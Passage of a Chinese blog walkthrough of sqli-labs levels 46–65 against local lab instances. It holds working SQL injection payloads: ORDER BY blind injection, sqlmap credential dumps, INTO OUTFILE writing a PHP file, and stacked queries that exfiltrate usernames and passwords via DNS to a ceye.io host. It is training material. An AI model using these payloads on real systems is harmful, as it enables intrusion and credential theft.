+</tr>
+</tbody></table>
+<p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p>
+<h2 id="lab46-order-by注入"><a href="#lab46-order-by注入" class="headerlink" title="lab46-order by注入"></a>lab46-order by注入</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>ORDER BY $id</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET 方式获取 sort 参数</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接将 id 带入 SQL 中</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></table></figure>
+
+<p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p>
+<h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><ul>
+<li><strong>升序和降序验证</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 升序排序</span><br><span class="line">?sort=1 asc</span><br><span class="line"></span><br><span class="line"># 降序排序</span><br><span class="line">?sort=1 dasc # dasc不是数据库中的关键字，会报错</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>rand () 验证</strong></li>
+</ul>
+<p>rand (ture) 和 rand (false) 的结果是不一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(true) # true 在MySQL中被转换为数字 1。每次执行都会返回相同的&quot;随机&quot;数</span><br><span class="line"></span><br><span class="line">?sort=rand(false) # true 在MySQL中被转换为数字 1。每次执行都会返回相同的&quot;随机&quot;数</span><br></pre></td></tr></table></figure>
+
+<p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p>
+<ul>
+<li><strong>延时验证</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=sleep(1) </span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)</span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(left(database(),1)&gt;&#x27;r&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="延时盲注-1"><a href="#延时盲注-1" class="headerlink" title="延时盲注"></a>延时盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br></pre></td></tr></table></figure>
+
+<h3 id="into-outfile-1"><a href="#into-outfile-1" class="headerlink" title="into outfile"></a>into outfile</h3><p><strong>将查询结果导入到文件中</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;/var/www/html/less46.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p>
+<p>访问验证是否有信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1:8888/less46.txt</span><br><span class="line">1    Dumb    Dumb</span><br><span class="line">2    Angelina    I-kill-you</span><br><span class="line">3    Dummy    p@ssword</span><br><span class="line">4    secure    crappy</span><br><span class="line">5    stupid    stupidity</span><br><span class="line">6    superman    genious</span><br><span class="line">7    batman    mob!le</span><br><span class="line">8    admin    admin</span><br><span class="line">9    admin1    admin1</span><br><span class="line">10    admin2    admin2</span><br><span class="line">11    admin3    admin3</span><br><span class="line">12    dhakkan    dumbo</span><br><span class="line">14    admin4    admin4</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用导出文件 getshell</strong>：</p>
+<p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p>
+<p>Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;F:/app/phpstudy_pro/WWW/sqli-labs-master/Less-46/1.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>SQL 关键字</th>
+<th>作用</th>
+<th>攻击目的</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LINES TERMINATED BY</td>
+<td>MySQL 特有的选项。 指定在每一行数据记录末尾添加的字符串。</td>
+<td>这是 Payload 的巧妙之处。 攻击者利用它来写入 PHP 代码，因为 SELECT * FROM users 通常会返回多行数据，而这个选项可以用来写入数据本身以外的代码。</td>
+</tr>
+<tr>
+<td>0x3c3f70687020706870696e666f28293b3f3e</td>
+<td>Hex 编码的恶意代码。</td>
+<td>写入恶意 PHP 代码。 MySQL 数据库的原生 SQL 语法支持以 <code>0x</code> 开头的字符串，并将它们识别为 Hex 字符串文字。当 MySQL 看到 <code>0x</code> 后跟十六进制数字时，它会在内部自动将这些十六进制值转换为它们对应的二进制或 ASCII 字符。</td>
+</tr>
+</tbody></table>
+<p>验证测试成功</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016112250750.png" alt="image-20251016112250750"></p>
+<h2 id="lab47-order-by注入"><a href="#lab47-order-by注入" class="headerlink" title="lab47-order by注入"></a>lab47-order by注入</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016112817992.png" alt="image-20251016112817992"></p>
+<p>由单引号闭合的order by注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27; into outfile &quot;F:/app/phpstudy_pro/WWW/sqli-labs-master/Less-47/1.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016112843743.png" alt="image-20251016112843743"></p>
+<h2 id="lab48-order-by延时注入"><a href="#lab48-order-by延时注入" class="headerlink" title="lab48-order by延时注入"></a>lab48-order by延时注入</h2><p>没有报错所以不能用报错注入，考虑用sqlmap进行布尔盲注或延时盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/Less-48/?sort=1 --batch</span><br><span class="line">python sqlmap.py -u http://localhost/Less-48/?sort=1   --current-db --batch</span><br><span class="line">python sqlmap.py -u http://localhost/Less-48/?sort=1  -D security --tables --batch</span><br><span class="line">python sqlmap.py -u http://localhost/Less-48/?sort=1  -D security -T users --columns --batch</span><br><span class="line">python sqlmap.py -u http://localhost/Less-48/?sort=1  -D security -T users -C username,password --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016113737494.png" alt="image-20251016113737494"></p>
+<h2 id="lab49-order-by延时注入"><a href="#lab49-order-by延时注入" class="headerlink" title="lab49-order by延时注入"></a>lab49-order by延时注入</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>ORDER BY &#39;$id&#39;</code></td>
+</tr>
+</tbody></table>
+<p>没有报错提示，所以使用延时注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/Less-49/?sort=1 --batch</span><br><span class="line">python sqlmap.py -u http://localhost/Less-49/?sort=1   --current-db --batch</span><br><span class="line">python sqlmap.py -u http://localhost/Less-49/?sort=1  -D security --tables --batch</span><br><span class="line">python sqlmap.py -u http://localhost/Less-49/?sort=1  -D security -T users --columns --batch</span><br><span class="line">python sqlmap.py -u http://localhost/Less-49/?sort=1  -D security -T users -C username,password --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016165313003.png" alt="image-20251016165313003"></p>
+<h2 id="lab50-order-by注入"><a href="#lab50-order-by注入" class="headerlink" title="lab50-order by注入"></a>lab50-order by注入</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>ORDER BY $id</code></td>
+</tr>
+</tbody></table>
+<p>和46关一样，可以使用updatexml进行报错注入，不过这个里面还可以使用堆叠注入，因为使用了mysqli_multi_query函数，支持多条sql语句执行。也可以延时注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-50/?sort=1;select load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(&#x27;%%&#x27;,username,password)) from users limit 0,1),&#x27;.3g5qjq.ceye.io\\abc&#x27;))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016170414331.png" alt="image-20251016170414331"></p>
+<h2 id="lab51-单引号闭合order-by注入-待"><a href="#lab51-单引号闭合order-by注入-待" class="headerlink" title="lab51-单引号闭合order by注入-待"></a>lab51-单引号闭合order by注入-待</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>ORDER BY &#39;$id&#39;</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-51/?sort=1&#x27;;select load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(&#x27;||&#x27;,username,password)) from users limit 0,1),&#x27;.3g5qjq.ceye.io\\abc&#x27;))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251017202612319.png" alt="image-20251017202612319"></p>
+<h2 id="lab52-order-by堆叠注入"><a href="#lab52-order-by堆叠注入" class="headerlink" title="lab52-order by堆叠注入"></a>lab52-order by堆叠注入</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注、堆叠注入</td>
+<td><code>ORDER BY $id</code></td>
+</tr>
+</tbody></table>
+<p>无闭合符号，没有回显报错信息，使用延时注入来进行堆叠注入即可</p>
+<h2 id="lab53-单引号闭合堆叠注入"><a href="#lab53-单引号闭合堆叠注入" class="headerlink" title="lab53-单引号闭合堆叠注入"></a>lab53-单引号闭合堆叠注入</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注、堆叠注入</td>
+<td><code>ORDER BY &#39;$id&#39;</code></td>
+</tr>
+</tbody></table>
+<p>没有报错，单引号闭合，用堆叠注入和延时注入即可</p>
+<h2 id="lab54-次数限制"><a href="#lab54-次数限制" class="headerlink" title="lab54-次数限制"></a>lab54-次数限制</h2><p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-54/?id=1&#x27; order by 3--+</span><br><span class="line">http://localhost/Less-54/?id=1&#x27; union select 1,2,3--+</span><br><span class="line">http://localhost/Less-54/?id=-1&#x27; union select 1,2,database()--+</span><br><span class="line">http://localhost/Less-54/?id=-1&#x27; union select 1,2,group_concat(table_name SEPARATOR &#x27;,&#x27;) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;--+   </span><br><span class="line">http://localhost/Less-54/?id=-1&#x27; union select 1,2,group_concat(column_name SEPARATOR &#x27;,&#x27;) from information_schema.columns where table_schema=&#x27;CHALLENGES&#x27; and table_name=&#x27;yp6ccprrk9&#x27;--+ </span><br><span class="line">http://localhost/Less-54/?id=-1&#x27; union select 1,group_concat(secret_8KQS SEPARATOR &#x27;,&#x27;),group_concat(tryy SEPARATOR &#x27;,&#x27;) from CHALLENGES.yp6ccprrk9--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251017203222819.png" alt="image-20251017203222819"></p>
+<h2 id="lab55-括号闭合限定次数"><a href="#lab55-括号闭合限定次数" class="headerlink" title="lab55-括号闭合限定次数"></a>lab55-括号闭合限定次数</h2><p>括号闭合</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251018123414165.png" alt="image-20251018123414165"></p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-55/?id=1) order by 3--+</span><br><span class="line">http://localhost/Less-55/?id=1) union select 1,2,3--+</span><br><span class="line">http://localhost/Less-55/?id=-1) union select 1,2,database()--+</span><br><span class="line">http://localhost/Less-55/?id=-1) union select 1,2,group_concat(table_name SEPARATOR &#x27;,&#x27;) from information_schema.tables where table_schema=&#x27;challenges&#x27;--+   </span><br><span class="line">http://localhost/Less-55/?id=-1) union select 1,2,group_concat(column_name SEPARATOR &#x27;,&#x27;) from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;seko3vy0np&#x27;--+ </span><br><span class="line">http://localhost/Less-55/?id=-1) union select 1,group_concat(secret_1YVF SEPARATOR &#x27;,&#x27;),group_concat(tryy SEPARATOR &#x27;,&#x27;) from challenges.seko3vy0np--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251018123653668.png" alt="image-20251018123653668"></p>
+<h2 id="lab56-单引号与括号闭合限定次数"><a href="#lab56-单引号与括号闭合限定次数" class="headerlink" title="lab56-单引号与括号闭合限定次数"></a>lab56-单引号与括号闭合限定次数</h2><p>由单引号与括号闭合，其它和上一关相同，不再赘述</p>
+<h2 id="lab57-双引号闭合限定次数"><a href="#lab57-双引号闭合限定次数" class="headerlink" title="lab57-双引号闭合限定次数"></a>lab57-双引号闭合限定次数</h2><p>由双引号闭合，其它和上一关相同，不再赘述</p>
+<h2 id="lab58-报错注入限定次数"><a href="#lab58-报错注入限定次数" class="headerlink" title="lab58-报错注入限定次数"></a>lab58-报错注入限定次数</h2><p>因为是硬编码的，所以不能用联合注入，只能用报错注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="comment">// ^ 定义一个硬编码的用户名数组。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">array_reverse</span>(<span class="variable">$unames</span>);</span><br><span class="line"><span class="comment">// ^ 定义一个硬编码的密码数组，它的值是用户名数组 $unames 的反转序列。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="comment">// ^ 输出用户的登录名。注意：它不是直接输出数据库中的用户名。</span></span><br><span class="line"><span class="comment">//   - 它使用数据库查询结果中的 $row[&#x27;id&#x27;]（即用户输入的 ID）作为索引，</span></span><br><span class="line"><span class="comment">//   - 从 PHP 的**预定义数组 $unames** 中查找对应的用户名。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="comment">// ^ 输出用户的密码。同样地，它使用 $row[&#x27;id&#x27;] 作为索引，</span></span><br><span class="line"><span class="comment">//   - 从 PHP 的**预定义数组 $pass** 中查找对应的密码。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-58/?id=1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select database()),0x7e),3)--+</span><br><span class="line">http://localhost/Less-58/?id=1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),3)--+</span><br><span class="line">http://localhost/Less-58/?id=1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;962uw7ne73&#x27;),0x7e),3)--+</span><br><span class="line">http://localhost/Less-58/?id=-1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select secret_DKAH from challenges.962uw7ne73),0x7e),3)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251018130037230.png" alt="image-20251018130037230"></p>
+<h2 id="lab59-整形注入限定次数"><a href="#lab59-整形注入限定次数" class="headerlink" title="lab59-整形注入限定次数"></a>lab59-整形注入限定次数</h2><p>整形注入，没有闭合，其他与上一关相同，此处不再赘述</p>
+<h2 id="lab60-双引号括号闭合限定次数"><a href="#lab60-双引号括号闭合限定次数" class="headerlink" title="lab60-双引号括号闭合限定次数"></a>lab60-双引号括号闭合限定次数</h2><p>双引号括号闭合，其他与上一关相同，此处不再赘述</p>
+<h2 id="lab61-单引号与两个括号闭合限定次数"><a href="#lab61-单引号与两个括号闭合限定次数" class="headerlink" title="lab61-单引号与两个括号闭合限定次数"></a>lab61-单引号与两个括号闭合限定次数</h2><p>单引号与两个括号闭合，其他与上一关相同，此处不再赘述</p>
+<h2 id="lab62-盲注限定次数"><a href="#lab62-盲注限定次数" class="headerlink" title="lab62-盲注限定次数"></a>lab62-盲注限定次数</h2><p>联合查询，报错注入都不行，使用盲注，不再赘述</p>
+<h2 id="lab63-单引号闭合盲注限定次数"><a href="#lab63-单引号闭合盲注限定次数" class="headerlink" title="lab63-单引号闭合盲注限定次数"></a>lab63-单引号闭合盲注限定次数</h2><p>单引号闭合，其他与上一关相同，此处不再赘述</p>
+<h2 id="lab64-双括号闭合盲注限定次数"><a href="#lab64-双括号闭合盲注限定次数" class="headerlink" title="lab64-双括号闭合盲注限定次数"></a>lab64-双括号闭合盲注限定次数</h2><p>双括号闭合，其他与上一关相同，此处不再赘述</p>
+<h2 id="lab65-双引号与双括号闭合盲注限定次数"><a href="#lab65-双引号与双括号闭合盲注限定次数" class="headerlink" title="lab65-双引号与双括号闭合盲注限定次数"></a>lab65-双引号与双括号闭合盲注限定次数</h2><p>双引号与双括号闭合，其他与上一关相同，此处不再赘述</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="wuyaxiao 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="wuyaxiao 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/09/23/CTF%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" rel="prev" title="CTF常用工具下载及使用">
+      <i class="fa fa-chevron-left"></i> CTF常用工具下载及使用
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/09/23/xss-labs%E9%9D%B6%E5%9C%BA/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+            
+    
+  
+
+  <!-- 应使用 elif 而不是 else if -->  
+  <div class="comments" id="comments">  
+    
+  <script src="https://utteranc.es/client.js"
+    repo="wuyaxiao/wuyaxiao.github.io"
+    issue-term="title"
+    theme="github-light"
+    crossorigin="anonymous"
+    async>
+  </script>
+  
+  </div>  
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">SQL注入基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%A1%A8%E5%92%8C%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.</span> <span class="nav-text">SQL注入中常用的关键字和系统表和函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.注入点测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%BD%93%E5%89%8D%E8%A1%A8%E8%A1%8C%E6%95%B0%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.当前表行数测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%B5%8B%E8%AF%95%E5%BD%93%E5%89%8D%E8%A1%A8%E4%B8%AD%E5%93%AA%E4%BA%9B%E5%88%97%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.测试当前表中哪些列有回显</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="nav-number">1.2.4.</span> <span class="nav-text">4.查询数据库名称</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E8%8E%B7%E5%8F%96"><span class="nav-number">1.2.5.</span> <span class="nav-text">5.数据表名获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E5%AD%97%E6%AE%B5%E8%8E%B7%E5%8F%96"><span class="nav-number">1.2.6.</span> <span class="nav-text">6.字段获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-%E8%AF%BB%E5%8F%96%E5%85%B3%E9%94%AE%E5%AD%97%E6%AE%B5"><span class="nav-number">1.2.7.</span> <span class="nav-text">7.读取关键字段</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">sqlmap注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET"><span class="nav-number">1.3.1.</span> <span class="nav-text">GET</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%88%A4%E5%AE%9A%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">1.判定是否存在注入点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E8%8E%B7%E5%8F%96"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">2.数据库名获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">3.获取数据库中的表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E5%AF%B9%E9%80%89%E5%AE%9A%E8%A1%A8%E7%9A%84%E5%88%97%E5%90%8D%E8%BF%9B%E8%A1%8C%E8%8E%B7%E5%8F%96"><span class="nav-number">1.3.1.4.</span> <span 